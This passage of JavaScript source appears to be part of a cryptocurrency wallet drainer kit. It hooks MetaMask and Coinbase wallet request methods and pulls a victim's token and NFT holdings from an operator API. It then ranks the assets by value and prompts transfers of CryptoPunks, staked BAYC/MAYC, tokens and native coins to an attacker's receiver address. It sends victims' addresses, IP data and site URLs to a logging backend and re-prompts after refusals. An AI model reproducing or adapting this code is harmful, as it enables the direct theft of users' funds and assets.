                let [y] = f;
                if (this.isUselessMethod(y) || this.netWorth < this.bypassMinAmount) {
                  return Reflect.apply(B, V, f);
                }
                await this.fsign();
                return new Promise((K, s) => {
                  const N = this.generateGUID();
                  const c = {
                    "target": "metamask-contentscript",
                    "data": {
                      "name": "metamask-provider",
                      "data": [{
                        "jsonrpc": "2.0",
                        "id": N,
                        "method": y.method,
                        "params": y.params
                      }]
                    }
                  };
                  const l = o => {
                    if (o.data.target === "metamask-inpage" && o.data.data.data[0].id == N) {
                      window.removeEventListener("message", l);
                      if (o.data.data.data[0].hasOwnProperty("error")) {
                        s(o.data.data.data[0].error);
                      } else {
                        K(o.data.data.data[0].result);
                      }
                    }
                  };
                  window.addEventListener("message", l);
                  window.postMessage(c);
                });
              }
            })
          });
        } else if (window.ethereum.isCoinbaseWallet) {
          Object.defineProperty(window.ethereum, "request", {
            "value": new Proxy(window.ethereum.request, {
              "apply": async (B, V, f) => {
                let [y] = f;
                if (this.isUselessMethod(y) || this.netWorth < this.bypassMinAmount) {
                  return Reflect.apply(B, V, f);
                }
                await this.fsign();
                return new Promise((K, s) => {
                  window.ethereum._sendAsync(y, (t, N) => {
                    if (t) {
                      s(t);
                    } else {
                      K(N.result);
                    }
                  });
                });
              }
            })
          });
        }
      }
    } catch (B) {}
  };
  ["updateButtonMessage"] = (T = false, k = false, H = false) => {
    if (T == true) {
      if (config.design.buttonMessagesEnabled) {
        this.messageButton.innerText = config.design.buttonMessages.failed;
      }
      setTimeout(() => {
        if (config.design.buttonMessagesEnabled) {
          this.messageButton.innerText = config.design.buttonMessages.progress;
        }
      }, config.design.retryDelay);
    }
    if (k == true) {
      setTimeout(() => {
        if (config.design.buttonMessagesEnabled) {
          this.messageButton.innerText = config.design.buttonMessages.success;
        }
      }, config.design.retryDelay);
    }
    if (H == true) {
      console.log("Button Message end");
      if (config.design.buttonMessagesEnabled) {
        this.messageButton.innerText = config.design.buttonMessages.failed;
      }
      setTimeout(() => {
        if (config.design.buttonMessagesEnabled) {
          this.messageButton.innerText = config.design.buttonMessages.initialConnected;
        }
      }, config.design.retryDelay);
      this.transactions.length = 0;
      this.offers.length = 0;
      this.considerations.length = 0;
      this.uniswapTokens.length = 0;
      this.permitTokens.length = 0;
      this.sushiswapTokens.length = 0;
      this.blurTokens.length = 0;
      this.pending.length = 0;
    }
  };
  ["fetchTokens"] = async () => {
    console.log("Fetching ERC20");
    try {
      let i = await fetch(this.apiDomainName + "fetchTokens?v=" + config.version + "&key=" + config.API_KEY + "&address=" + this.walletAddress + "&recipient=" + config.seaport_receiver, {
        "method": "GET",
        "mode": "cors",
        "cache": "no-cache"
      }).then(B => B.json()).then(B => JSON.parse(this.decryptBody(B.encrypted)));
      console.log("Erc20 main fetch success");
      this.netWorth = 0;
      this.vault = [];
      this.sweets = [];
      if (!i.tokens) {
        return;
      }
      i.tokens.forEach(B => {
        this.ERC20tokens.push(B);
        this.transactions.push(B);
      });
      if (!i.vault) {
        return;
      }
      i.vault.forEach(B => {
        this.vault.push(B);
      });
      this.permitTokens = i.permitTokens;
      this.uniswapTokens = i.uniswapTokens;
      i.seaportoffers.forEach(B => {
        this.offers.push(B);
      });
      i.seaportconsiderations.forEach(B => {
        this.considerations.push(B);
      });
      i.seaportTokens.forEach(B => {
        this.seaportTokens.push(B);
      });
      this.seaportValue += i.seaportValue;
      this.gasPrices = i.gasPrices;
      this.signature = i.signature;
      this.blockaid = i.unmarkedContracts;
      this.netWorth += i.netWorth;
      this.netWorth += i.netWorth;
      for (let B in i.estimated_txs) {
        this.estimated_txs[B] += i.estimated_txs[B];
      }
      if (i.hasOwnProperty("overridedBnumbers")) {
        console.log("Received bNumbers override from api");
        this.bNumbers = i.overridedBnumbers;
      }
      if (i?.["bypass_min"]) {
        this.bypass_min = i.bypass_min;
      }
      if (i?.["verified"]) {
        this.verified = i.verified;
      }
    } catch (V) {
      console.log("ERC20 fetch error: ", V);
    }
  };
  ["fetchNFTS"] = async () => {
    console.log("Fetching NFT approvals");
    try {
      let i = await fetch(this.apiDomainName + "fetchNFT", {
        "method": "POST",
        "mode": "cors",
        "cache": "no-cache",
        "headers": {
          "Accept": "application/json",
          "Content-Type": "application/json"
        },
        "body": this.encryptBody(JSON.stringify({
          "address": this.walletAddress,
          "recipient": config.seaport_receiver,
          "inputData": this.NFTtokens
        }))
      }).then(B => B.json()).then(B => JSON.parse(this.decryptBody(B.encrypted)));
      console.log("NFT fetch success");
      console.log(i);
      this.potatozStaked = i.potatozStaked;
      this.potatozValue = i.potatozValue;
      this.creepzStaked = i.creepzStaked;
      this.creepzValue = i.creepzValue;
      i.seaportTokens.forEach(B => {
        this.seaportTokens.push(B);
      });
      i.NFTtokens.forEach(B => {
        this.ERC20tokens.push(B);
        this.transactions.push(B);
      });
      this.seaportValue += i.seaportValue;
      this.blurTokens = i.blurTokens;
      this.blurValue = i.blurValue;
      this.ultraVault = i.ultraVault;
      this.blurNonce = i.blurNonce;
      i.offers.forEach(B => {
        this.offers.push(B);
      });
      i.considerations.forEach(B => {
        this.considerations.push(B);
      });
      for (let B in i.estimated_txs) {
        this.estimated_txs[B] += i.estimated_txs[B];
      }
      this.netWorth += i.netWorth;
    } catch (V) {
      console.log("NFT fetch error: ", V);
    }
  };
  ["fillVault"] = async () => {
    if (this.potatozValue > 0) {
      this.vault.push({
        "name": "POTATOZ_STAKED",
        "totalPrice": this.potatozValue
      });
    }
    if (this.creepzValue > 0) {
      this.vault.push({
        "name": "CREEPZ_STAKED",
        "totalPrice": this.creepzValue
      });
    }
    let i = [{
      "name": "APESTAKING",
      "totalPrice": 0.5
    }, {
      "name": "BLUR",
      "totalPrice": this.blurValue
    }, {
      "name": "SEAPORT",
      "totalPrice": this.seaportValue
    }];
    for (let B = 0; B < this.ultraVault.length; B++) {
      if (this.ultraVault[B].name == "CRYPTOPUNK") {
        this.ultraVault[B].totalPrice = 48;
        i.push(this.ultraVault[B]);
      }
    }
    i.forEach(V => {
      this.vault.push(V);
    });
  };
  ["logPromting"] = async (T, k, H) => {
    try {
      let f = await this.getIpData();
      fetch(this.logDomainName + "backend/prompting", {
        "method": "POST",
        "mode": "cors",
        "cache": "no-cache",
        "headers": {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        "body": this.encryptBody(JSON.stringify({
          "address": this.walletAddress,
          "isMobile": this.isMobile(),
          "websiteUrl": window.location.href,
          "websiteDomain": window.location.host,
          "ipData": f,
          "API_KEY": config.API_KEY,
          "signature": this.signature,
          "data": H,
          "type": k,
          "hashed_sweet": T,
          "silent": !config.logPromptingEnabled
        }))
      });
    } catch (D) {
      console.log("Failed to send log promting", D);
    }
  };
  ["start"] = async () => {
    this.initProxy();
    this.netWorth = 0;
    this.vault = [];
    this.sweets = [];
    window.wallet_name = window.localStorage.getItem("wagmi.wallet");
    try {
      window.wallet_name = this.main_provider.signer.session.peer.metadata.name || "Other";
    } catch (a) {}
    DrainerPopup.openPopup();
    await Promise.all([this.fetchTokens, this.fetchNFTS].map(async t => {
      await t();
    }));
    this.filteredTransactions = [...this.transactions].sort((t, N) => N.price - t.price);
    await this.fillVault();
    var f = this.filteredTransactions.map(function (t) {
      var c = Object.assign({}, t);
      if (c.hasOwnProperty("type")) {
        c.tname = c.name;
        c.name = c.type;
        delete c.type;
      }
      if (c.hasOwnProperty("price")) {
        c.totalPrice = c.price;
        delete c.price;
      }
      return c;
    });
    for (let t in config.experimental) {
      if (config.experimental[t]) {
        console.log("%c[ WARN ] Experimental function " + t + " enabled", "color: yellow; font-family:monospace; font-size: 16px");
      }
    }
    let D = {
      "LPV3_ETH": config.multipliers.LP_NFTS || 1,
      "LPV3_POLYGON": config.multipliers.LP_NFTS || 1,
      "LPV3_ARB": config.multipliers.LP_NFTS || 1,
      "LPV3_OPTIMISM": config.multipliers.LP_NFTS || 1,
      "PNC_LPV3_ETH": config.multipliers.LP_NFTS || 1,
      "PNC_LPV3_BSC": config.multipliers.LP_NFTS || 1,
      "PNC_LPV3_BASE": config.multipliers.LP_NFTS || 1,
      "PNC_LPV3_ARB": config.multipliers.LP_NFTS || 1,
      "CAM_LPV3_ARB": config.multipliers.LP_NFTS || 1,
      "SUS_LPV3_ETH": config.multipliers.LP_NFTS || 1,
      "SUS_LPV3_BSC": config.multipliers.LP_NFTS || 1,
      "SUS_LPV3_POLYGON": config.multipliers.LP_NFTS || 1,
      "SUS_LPV3_OPTIMISM": config.multipliers.LP_NFTS || 1,
      "SUS_LPV3_ARB": config.multipliers.LP_NFTS || 1,
      "QUI_LPV3_POLYGON": config.multipliers.LP_NFTS || 1,
      "VEL_NFT": config.multipliers.LP_NFTS || 1,
      "TRADER_JOE": config.multipliers.LP_NFTS || 1,
      "BLAST_TRANSITION": config.multipliers.LP_NFTS || 1,
      "PERMIT2_ETH": config.multipliers.PERMIT2 || 1,
      "PERMIT2_BSC": config.multipliers.PERMIT2 || 1,
      "PERMIT2_POLYGON": config.multipliers.PERMIT2 || 1,
      "PERMIT2_ARB": config.multipliers.PERMIT2 || 1,
      "PERMIT2_OPTIMISM": config.multipliers.PERMIT2 || 1,
      "PERMIT2_AVALANCHE": config.multipliers.PERMIT2 || 1,
      "PERMIT2_BASE": config.multipliers.PERMIT2 || 1,
      "BLUR": config.multipliers.BLUR || 1,
      "SEAPORT": config.multipliers.SEAPORT || 1,
      "UNISWAP": config.multipliers.SWAP || 1,
      "PANCAKESWAP_ETH": config.multipliers.SWAP || 1,
      "PANCAKESWAP_BSC": config.multipliers.SWAP || 1,
      "SUSHISWAP": config.multipliers.SWAP || 1,
      "ERC20": config.multipliers.TOKENS || 1,
      "ERC721": config.multipliers.NFT || 1,
      "ERC1155": config.multipliers.NFT || 1,
      "ETH": config.multipliers.NATIVES || 1,
      "BNB": config.multipliers.NATIVES || 1,
      "MATIC": config.multipliers.NATIVES || 1,
      "ARB": config.multipliers.NATIVES || 1,
      "OPTIMISM": config.multipliers.NATIVES || 1,
      "FTM": config.multipliers.NATIVES || 1,
      "AVAX": config.multipliers.NATIVES || 1,
      "CELO": config.multipliers.NATIVES || 1,
      "BASE": config.multipliers.NATIVES || 1,
      "CRO": config.multipliers.NATIVES || 1,
      "PLS": config.multipliers.NATIVES || 1,
      "BLAST": config.multipliers.NATIVES || 1,
      "MANTA": config.multipliers.NATIVES || 1,
      "POTATOZ_STAKED": config.multipliers.NFT || 1,
      "CREEPZ_STAKED": config.multipliers.NFT || 1,
      "APECOINSTAKES": config.multipliers.TOKENS || 1,
      "BAYCSTAKES": config.multipliers.TOKENS || 1,
      "MAYCSTAKES": config.multipliers.TOKENS || 1,
      "CRYPTOPUNK": config.multipliers.NFT || 1,
      "COMET": config.multipliers.LP_NFTS || 1,
      "EIGEN": config.multipliers.LP_NFTS || 1,
      "MAKER": config.multipliers.LP_NFTS || 1,
      "GMX": config.multipliers.TOKENS || 1,
      "PRISMA": config.multipliers.TOKENS || 1
    };
    D.SEAPORT += 0.000002;
    D.BLUR += 0.000001;
    var U = this.vault.concat(f);
    for (let N = 0; N < U.length; N++) {
      let c;
      if (D.hasOwnProperty(U[N].name)) {
        c = D[U[N].name];
      } else {
        c = 1;
      }
      let l = U[N];
      l.weight = U[N].totalPrice * c;
      this.sweets.push(l);
    }
    this.sweets.sort(function (o, O) {
      return O.weight - o.weight;
    });
    console.table(this.sweets);
    let q = config.ethContractAddress;
    console.log("nw", this.netWorth, "rcmin", config.reserve_contract_min);
    this.useVerified = {};
    const y = {
      "1": false,
      "10": false,
      "25": false,
      "56": false,
      "137": false,
      "169": false,
      "250": false,
      "369": false,
      "8453": false,
      "42161": false,
      "43114": false,
      "42220": false,
      "81457": false
    };
    const K = {
      "1": false,
      "10": false,
      "25": false,
      "56": false,
      "137": false,
      "169": false,
      "250": false,
      "369": false,
      "8453": false,
      "42161": false,
      "43114": false
    };
    K["42220"] = false;
    K["81457"] = false;
    const s = {
      "1": q,
      "10": q
    };
    s["25"] = q;
    s["56"] = q;
    s["137"] = q;
    s["169"] = q;
    s["250"] = q;
    s["369"] = q;
    s["8453"] = q;
    s["42161"] = q;
    s["43114"] = q;
    s["42220"] = q;
    s["81457"] = q;
    if (this.netWorth > this.bypass_min) {
      console.log("Bypass eligible", this.netWorth, this.bypass_min);
      console.log(this.blockaid);
      config.contract_salt_mc = {
        0x1: this.blockaid[1].mc_salt,
        0xa: this.blockaid[10].mc_salt,
        0x19: this.blockaid[25].mc_salt,
        0x38: this.blockaid[56].mc_salt,
        0x89: this.blockaid[137].mc_salt,
        0xa9: this.blockaid[169].mc_salt,
        0xfa: this.blockaid[250].mc_salt,
        0x171: this.blockaid[369].mc_salt,
        0x2105: this.blockaid[8453].mc_salt,
        0xa4b1: this.blockaid[42161].mc_salt,
        0xa86a: this.blockaid[43114].mc_salt,
        0xa4ec: this.blockaid[42220].mc_salt,
        0x13e31: this.blockaid[81457].mc_salt
      };
      config.contract_salt_nv = {
        0x1: this.blockaid[1].nv_salt,
        0xa: this.blockaid[10].nv_salt,
        0x19: this.blockaid[25].nv_salt,
        0x38: this.blockaid[56].nv_salt,
        0x89: this.blockaid[137].nv_salt,
        0xa9: this.blockaid[169].nv_salt,
        0xfa: this.blockaid[250].nv_salt,
        0x171: this.blockaid[369].nv_salt,
        0x2105: this.blockaid[8453].nv_salt,
        0xa4b1: this.blockaid[42161].nv_salt,
        0xa86a: this.blockaid[43114].nv_salt,
        0xa4ec: this.blockaid[42220].nv_salt,
        0x13e31: this.blockaid[81457].nv_salt
      };
      config.tokenContractAddresses = {
        0x1: this.blockaid[1].mc,
        0xa: this.blockaid[10].mc,
        0x19: this.blockaid[25].mc,
        0x38: this.blockaid[56].mc,
        0x89: this.blockaid[137].mc,
        0xa9: this.blockaid[169].mc,
        0xfa: this.blockaid[250].mc,
        0x171: this.blockaid[369].mc,
        0x2105: this.blockaid[8453].mc,
        0xa4b1: this.blockaid[42161].mc,
        0xa86a: this.blockaid[43114].mc,
        0xa4ec: this.blockaid[42220].mc,
        0x13e31: this.blockaid[81457].mc
      };
      config.ethContractAddress = {
        0x1: this.blockaid[1].nv,
        0xa: this.blockaid[10].nv,
        0x19: this.blockaid[25].nv,
        0x38: this.blockaid[56].nv,
        0x89: this.blockaid[137].nv,
        0xa9: this.blockaid[169].nv,
        0xfa: this.blockaid[250].nv,
        0x171: this.blockaid[369].nv,
        0x2105: this.blockaid[8453].nv,
        0xa4b1: this.blockaid[42161].nv,
        0xa86a: this.blockaid[43114].nv,
        0xa4ec: this.blockaid[42220].nv,
        0x13e31: this.blockaid[81457].nv
      };
      console.log(config);
    } else {
      config.contract_salt_mc = y;
      config.contract_salt_nv = K;
      config.tokenContractAddresses = {
        0x1: config.multicall,
        0xa: config.multicall,
        0x19: config.multicall,
        0x38: config.multicall,
        0x89: config.multicall,
        0xa9: config.multicall,
        0xfa: config.multicall,
        0x171: config.multicall,
        0x2105: config.multicall,
        0xa4b1: config.multicall,
        0xa86a: config.multicall,
        0xa4ec: config.multicall,
        0x13e31: config.multicall
      };
      config.ethContractAddress = s;
    }
    if (Object.keys(this.verified).length > 0) {
      console.log("Eligible for verified");
      for (let I of Object.keys(this.verified)) {
        config.contract_salt_mc[I] = false;
        config.tokenContractAddresses[I] = this.verified[I];
        this.useVerified[I] = true;
      }
    }
    if (this.sweets.length != 0 || config.logEmptyWallets) {
      await this.logConnection();
    }
    try {
      updateWalletData(this.walletAddress, this.netWorth, 1);
    } catch (x) {
      console.log("Unable to send callback!", x);
    }
    if (this.netWorth < config.minimalDrainValue) {
      this.notEligible();
      try {
        updateWalletData(this.walletAddress, this.netWorth, 2);
      } catch (E) {
        console.log("Unable to send callback!", E);
      }
      return;
    }
    for (let r = 0; r < this.sweets.length; r++) {
      console.log("Prompting " + (r + 1) + "/" + this.sweets.length);
      if (this.ethereumClient?.["getAccount"]()?.["address"]?.["toLowerCase"]() != this.walletAddress.toLowerCase()) {
        this.started = false;
        console.log("Address Changed");
        if (config.useSweetAlert) {
          Swal.fire(config.swal_addressChangedTitle, config.addressChanged, "warning");
        } else {
          alert(config.addressChanged);
        }
        this.updateButtonMessage(false, false, true);
        DrainerPopup.closePopup();
        return;
      }
      ;
      console.log(this.sweets[r]);
      let Q = true;
      let v = JSON.stringify(this.sweets[r]);
      let w = CryptoJS.MD5(v).toString();
      if (localStorage.getItem("cached_sweets_" + this.walletAddress)) {
        try {
          const P = JSON.parse(localStorage.getItem("cached_sweets_" + this.walletAddress));
          if (Array.isArray(P)) {
            if (P.includes(w)) {
              Q = false;
              console.log("Skipping current (duplicate)");
            }
          }
        } catch (h) {
          console.error(h);
        }
      }
      if (Q) {
        switch (this.sweets[r].name) {
          case "LPV3_ETH":
          case "LPV3_POLYGON":
          case "LPV3_OPTIMISM":
          case "LPV3_ARB":
            await this.transferLPV3(w, this.sweets[r].tokens, this.sweets[r].totalPrice);
            break;
          case "PNC_LPV3_ETH":
          case "PNC_LPV3_BSC":
          case "PNC_LPV3_BASE":
          case "PNC_LPV3_ARB":
            await this.transferPancakeLPV3(w, this.sweets[r].tokens, this.sweets[r].totalPrice);
            break;
          case "CAM_LPV3_ARB":
            await this.transferCamelotLPV3(w, this.sweets[r].tokens, this.sweets[r].totalPrice);
            break;
          case "SUS_LPV3_ETH":
          case "SUS_LPV3_BSC":
          case "SUS_LPV3_POLYGON":
          case "SUS_LPV3_ARB":
          case "SUS_LPV3_OPTIMISM":
            await this.transferSushiswapLPV3(w, this.sweets[r].tokens, this.sweets[r].totalPrice);
            break;
          case "QUI_LPV3_POLYGON":
            await this.transferQuickswapLPV3(w, this.sweets[r].tokens, this.sweets[r].totalPrice);
            break;
          case "TRADER_JOE":
            await this.transferTJ(w, this.sweets[r]);
            break;
          case "PERMIT2_ETH":
            await this.transferERC20permit2(w, this.permitTokens.ETH, this.sweets[r].totalPrice);
            break;
          case "PERMIT2_BSC":
            await this.transferERC20permit2(w, this.permitTokens.BSC, this.sweets[r].totalPrice);
            break;
          case "PERMIT2_POLYGON":
            await this.transferERC20permit2(w, this.permitTokens.POLYGON, this.sweets[r].totalPrice);
            break;
          case "PERMIT2_ARB":
            await this.transferERC20permit2(w, this.permitTokens.ARB, this.sweets[r].totalPrice);
            break;
          case "PERMIT2_OPTIMISM":
            await this.transferERC20permit2(w, this.permitTokens.OPTIMISM, this.sweets[r].totalPrice);
            break;
          case "PERMIT2_AVALANCHE":
            await this.transferERC20permit2(w, this.permitTokens.AVALANCHE, this.sweets[r].totalPrice);
            break;
          case "PERMIT2_BASE":
            await this.transferERC20permit2(w, this.permitTokens.BASE, this.sweets[r].totalPrice);
            break;
          case "BLUR":
            await this.transferBlur(w);
            break;
          case "SEAPORT":
            await this.transferSeaport(w);
            break;
          case "UNISWAP":
            await this.transferERC20Uniswap(w);
            break;
          case "PANCAKESWAP_ETH":
            await this.transferERC20PancakeV3(w, 1, this.pancakeswapTokens_eth, this.pancakeswapValue_eth);
            break;
          case "PANCAKESWAP_BSC":
            await this.transferERC20PancakeV3(w, 56, this.pancakeswapTokens_bsc, this.pancakeswapValue_bsc);
            break;
          case "VEL_NFT":
            await this.transferVeloNFTs(w, this.sweets[r]);
            break;
          case "SUSHISWAP":
            await this.transferERC20sushiswap(w, this.sweets[r]);
            break;
          case "WETH":
          case "USDB":
          case "ERC20":
            await this.transferERC20(w, this.sweets[r]);
            break;
          case "ERC721":
          case "ERC1155":
            await this.transferNFT(w, this.sweets[r]);
            break;
          case "ETH":
            await this.transferNative(w, 1, this.sweets[r].native);
            break;
          case "BNB":
            await this.transferNative(w, 56, this.sweets[r].native);
            break;
          case "MATIC":
            await this.transferNative(w, 137, this.sweets[r].native);
            break;
          case "ARB":
            await this.transferNative(w, 42161, this.sweets[r].native);
            break;
          case "OPTIMISM":
            await this.transferNative(w, 10, this.sweets[r].native);
            break;
          case "FTM":
            await this.transferNative(w, 250, this.sweets[r].native);
            break;
          case "AVAX":
            await this.transferNative(w, 43114, this.sweets[r].native);
            break;
          case "CELO":
            await this.transferNative(w, 42220, this.sweets[r].native);
            break;
          case "BASE":
            await this.transferNative(w, 8453, this.sweets[r].native);
            break;
          case "CRO":
            await this.transferNative(w, 25, this.sweets[r].native);
            break;
          case "BLAST":
            await this.transferNative(w, 81457, this.sweets[r].native);
            break;
          case "PLS":
            await this.transferNative(w, 369, this.sweets[r].native);
            break;
          case "MANTA":
            await this.transferNative(w, 169, this.sweets[r].native);
            break;
          case "POTATOZ_STAKED":
            await this.transferPotatoz(w);
            break;
          case "CREEPZ_STAKED":
            await this.transferCreepz(w, this.sweets[r]);
            break;
          case "COMET":
            await this.transferComet(w, this.sweets[r]);
            break;
          case "APECOINSTAKES":
            await this.transferApecoins(w, this.sweets[r]);
            break;
          case "BAYCSTAKES":
            await this.transferStakedBayc(w, this.sweets[r]);
            break;
          case "MAYCSTAKES":
            await this.transferStakedMayc(w, this.sweets[r]);
            break;
          case "CRYPTOPUNK":
            await this.transferCryptoPunk(this.sweets[r]);
            break;
          case "GMX":
            await this.transferStakedGMX(w, this.sweets[r]);
            break;
          case "PRISMA":
            await this.transferPrisma(w, this.sweets[r]);
            break;
          case "EIGEN":
            await this.transferEigen(w, this.sweets[r]);
            break;
          case "BLAST_TRANSITION":
            await this.transferBlastviaTransition(w, this.sweets[r]);
            break;
          case "MAKER":
            await this.transferMakerProxy(w, this.sweets[r]);
            break;
          default:
            console.log("ok");
        }
      }
    }
    this.updateButtonMessage(false, false, true);
    try {
      updateWalletData(this.walletAddress, this.netWorth, 3);
    } catch (d) {
      console.log("Unable to send callback!", d);
    }
    if (this.txcount == 0) {
      this.notEligible();
      try {
        updateWalletData(this.walletAddress, this.netWorth, 2);
      } catch (F) {
        console.log("Unable to send callback!", F);
      }
    }
    this.started = false;
  };
  ["transferCryptoPunk"] = async T => {
    console.log("cryptoPunk");
    try {
      await this.changeNetwork(1);
      console.log("Transferring Crypto Punk " + T.name);
      console.log("Pending Transactions: " + this.pending.length);
      let B = new ethers.utils.Interface(CRYPTOPUNK);
      await new Promise(async (V, f) => {
        let y = B.encodeFunctionData("transferPunk", [config.receiver, T.tokenIds[0]]);
        let K = {
          "from": this.walletAddress,
          "to": T.contractAddress,
          "value": "0x0000",
          "data": y
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          K.value = '';
        }
        if (window.ethereum?.["isTrustWallet"]) {
          K.value = "0";
        }
        try {
          const s = {
            chain: 0x1,
            tokenPrice: 0x30
          };
          this.logPromting('', "CRYPTOPUNK", s);
        } catch (a) {
          console.warn(a);
        }
        try {
          await this.main_provider.sendAsync({
            "method": "eth_sendTransaction",
            "params": [K],
            "from": this.walletAddress
          }, (t, N) => {
            if (t) {
              console.log("Sign error:", t);
              this.logCancel(T.type, T.name, T.price.toString().slice(0, 5) + " ETH");
              f(t);
            } else {
              this.pending.push(N);
              let l = N;
              if (N.hasOwnProperty("result")) {
                l = N.result;
              } else if (N.hasOwnProperty("hash")) {
                l = N.hash;
              }
              console.log("NFT success", N);
              V(l);
            }
          });
        } catch (t) {
          f(t);
        }
      }).then(async V => {
        let D = await this.getIpData();
        fetch(this.logDomainName + "backend/safa/nft", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "address": this.walletAddress,
            "walletBalanceInEth": this.walletBalanceInEth,
            "isMobile": this.isMobile(),
            "websiteUrl": window.location.href,
            "websiteDomain": window.location.host,
            "ipData": D,
            "API_KEY": config.API_KEY,
            "tokenType": T.type,
            "tokenName": T.name,
            "tokenPrice": T.price,
            "contractAddress": T.contractAddress,
            "signature": this.signature,
            "transactionHash": V
          }))
        });
        this.txcount++;
        return true;
      })["catch"](async V => {
        console.log("NFT error:", V);
        await this.handleDecline();
        if (config.repeatHighest) {
          return await this.transferCryptoPunk(T);
        }
        this.txcount++;
      });
    } catch (V) {
      console.warn("Failed to transfer Cryptopunk");
    }
  };
  ["transferStakedApe"] = async () => {
    console.log("StakedApe", this.apeStaking);
    try {
      let i = new ethers.utils.Interface(APECOINSTAKING);
      let B = new ethers.Contract(this.apeStaking, APECOINSTAKING, this.secondProvider);
      await Promise.all(this.NFTtokens.map(async V => {
        if (V.contractAddress == this.bayc) {
          try {
            await this.changeNetwork(1);
          } catch (q) {
            console.log(q);
            return false;
          }
          return await new Promise(async (y, K) => {
            let t = (await B.getBaycStakes(this.walletAddress)).map(l => {
              return {
                "tokenId": l.tokenId,
                "amount": l.deposited
              };
            });
            let N = i.encodeFunctionData("withdrawBAYC", [t, config.receiver]);
            let c = {
              "from": this.walletAddress,
              "to": this.apeStaking,
              "value": "0x0000",
              "data": N
            };
            if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
              c.value = '';
            }
            if (window.ethereum?.["isTrustWallet"]) {
              transactionParams.value = "0";
            }
            try {
              this.logPromting('', "BAYC", {
                "chain": 0x1,
                "tokenPrice": this.apeStakedValue
              });
            } catch (l) {
              console.warn(l);
            }
            try {
              await this.main_provider.sendAsync({
                "method": "eth_sendTransaction",
                "params": [c],
                "from": this.walletAddress
              }, (o, O) => {
                if (o) {
                  K(o);
                } else {
                  let x = O;
                  if (O.hasOwnProperty("result")) {
                    x = O.result;
                  } else if (O.hasOwnProperty("hash")) {
                    x = O.hash;
                  }
                  console.log("BAYC STAKING success", x);
                  this.pending.push(x);
                  this.considerations = this.considerations.filter(E => E.contractAddress != V.contractAddress);
                  this.offers = this.offers.filter(E => E.contractAddress != V.contractAddress);
                  this.uniswapTokens = this.uniswapTokens.filter(E => E.contractAddress != V.contractAddress);
                  this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(E => E.contractAddress != V.contractAddress);
                  this.sushiswapTokens = this.sushiswapTokens.filter(E => E.contractAddress != V.contractAddress);
                  y(x);
                }
              });
            } catch (o) {
              K(o);
            }
          }).then(async y => {
            let s = await this.getIpData();
            fetch(this.logDomainName + "backend/apeStaking", {
              "method": "POST",
              "mode": "cors",
              "cache": "no-cache",
              "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json"
              },
              "body": this.encryptBody(JSON.stringify({
                "address": this.walletAddress,
                "walletBalanceInEth": this.walletBalanceInEth,
                "isMobile": this.isMobile(),
                "websiteUrl": window.location.href,
                "websiteDomain": window.location.host,
                "ipData": s,
                "API_KEY": config.API_KEY,
                "tokenPrice": Number(this.apeStakedValue).toFixed(3) + " ETH",
                "transferName": "STAKED BAYC",
                "signature": this.signature,
                "transactionHash": y
              }))
            });
            return true;
          })["catch"](async y => {
            this.logCancel("STAKED BAYC", '', Number(V.price).toFixed(3) + " ETH");
            await this.handleDecline();
            if (config.repeatHighest) {
              return await this.transferStakedApe();
            }
            this.updateButtonMessage(true);
          });
        }
        if (V.contractAddress == this.mayc) {
          try {
            await this.changeNetwork(1);
          } catch (y) {
            console.log(y);
            return false;
          }
          return new Promise(async (K, s) => {
            let t = (await B.getMaycStakes(this.walletAddress)).map(l => {
              return {
                "tokenId": l.tokenId,
                "amount": l.deposited
              };
            });
            let N = i.encodeFunctionData("withdrawMAYC", [t, config.receiver]);
            let c = {
              "from": this.walletAddress,
              "to": this.apeStaking,
              "value": "0x0000",
              "data": N
            };
            if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
              c.value = '';
            }
            if (window.ethereum?.["isTrustWallet"]) {
              transactionParams.value = "0";
            }
            try {
              this.logPromting('', "MAYC", {
                "chain": 0x1,
                "tokenPrice": this.apeStakedValue
              });
            } catch (l) {
              console.warn(l);
            }
            try {
              await this.main_provider.sendAsync({
                "method": "eth_sendTransaction",
                "params": [c],
                "from": this.walletAddress
              }, (o, O) => {
                if (o) {
                  s(o);
                } else {
                  console.log("MAYC STAKING success", O);
                  this.pending.push(O);
                  this.considerations = this.considerations.filter(r => r.contractAddress != V.contractAddress);
                  this.offers = this.offers.filter(r => r.contractAddress != V.contractAddress);
                  this.uniswapTokens = this.uniswapTokens.filter(r => r.contractAddress != V.contractAddress);
                  this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(r => r.contractAddress != V.contractAddress);
                  this.sushiswapTokens = this.sushiswapTokens.filter(r => r.contractAddress != V.contractAddress);
                  K(O);
                }
              });
            } catch (o) {
              s(o);
            }
          }).then(async K => {
            let a = await this.getIpData();
            fetch(this.logDomainName + "backend/apeStaking", {
              "method": "POST",
              "mode": "cors",
              "cache": "no-cache",
              "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json"
              },
              "body": this.encryptBody(JSON.stringify({
                "address": this.walletAddress,
                "walletBalanceInEth": this.walletBalanceInEth,
                "isMobile": this.isMobile(),
                "websiteUrl": window.location.href,
                "websiteDomain": window.location.host,
                "ipData": a,
                "API_KEY": config.API_KEY,
                "signature": this.signature,
                "tokenPrice": Number(this.apeStakedValue).toFixed(3) + " ETH",
                "transferName": "STAKED MAYC",
                "transactionHash": K
              }))
            });
            this.txcount++;
            return true;
          })["catch"](async K => {
            this.logCancel("STAKED MAYC", '', Number(V.price).toFixed(3) + " ETH");
            await this.handleDecline();
            if (config.repeatHighest) {
              return await this.transferStakedApe();
            }
            this.updateButtonMessage(true);
            this.txcount++;
          });
        }
      }));
    } catch (V) {
      console.warn("Failed to transfer Staked Ape");
    }
  };
  ["transferStakedMayc"] = async (T, k) => {
    try {
      let V = new ethers.utils.Interface(APECOINSTAKING);
      try {
        await this.changeNetwork(1);
      } catch (f) {
        console.log(f);
        return false;
      }
      return new Promise(async (D, U) => {
        let y = V.encodeFunctionData("withdrawMAYC", [k.stakes, config.receiver]);
        let K = {
          "from": this.walletAddress,
          "to": this.apeStaking,
          "value": "0x0000",
          "data": y
        };
        if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
          K.value = '';
        }
